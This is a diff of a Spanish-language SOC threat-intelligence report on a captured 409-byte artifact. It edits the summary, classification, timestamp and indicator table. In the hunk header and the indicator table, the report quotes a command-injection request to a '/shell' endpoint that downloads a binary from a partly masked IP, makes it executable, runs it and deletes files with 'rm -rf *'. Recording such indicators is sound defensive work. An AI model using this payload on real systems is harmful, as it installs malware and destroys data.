@@ -4,16 +4,16 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Payload** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Cambio de permisos, Limpieza. Se asoció 1 comando observado o extraído.
+Artefacto de 409 B. Formato identificado como ASCII text, with CRLF line terminators. Entropía registrada: 5.41. No existe evidencia suficiente para atribuir este artefacto a una familia concreta. Comportamientos destacados: Descarga remota, Cambio de permisos, Limpieza. Se identificó 1 comando observado o extraído. Se identificaron 4 indicadores técnicos.
+
 
 ## 🏷️ Clasificación
 
-- **Categoría:** `Payload`
 - **Riesgo:** `Medium`
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T20:00:23+00:00`
+- **Registrado:** `2026-08-09T20:00:23.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -51,10 +51,10 @@ GET /shell?cd+/tmp;rm+narz;wget+http:/\/93.115.101.XXX:13734/narz;chmod+777+narz
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 190.179.168.XXX | static_analysis |
 | ip | 93.115.101.XXX | static_analysis |
-| hash | ed460d91cf86f1974a79873e4ca4df296dfbaae905987b22dd7d4a42c0d13677 | static_analysis |
+| ip | 190.179.168.XXX | static_analysis |
 | command | GET /shell?cd+/tmp;rm+narz;wget+http:/\/93.115.101.XXX:13734/narz;chmod+777+narz;./narz;rm+-rf+* HTTP/1.1 | strings |
+| hash | ed460d91cf86f1974a79873e4ca4df296dfbaae905987b22dd7d4a42c0d13677 | static_analysis |
 | ip | 138.197.41.XXX | artifact_source |
 
 ## 🔎 Triage
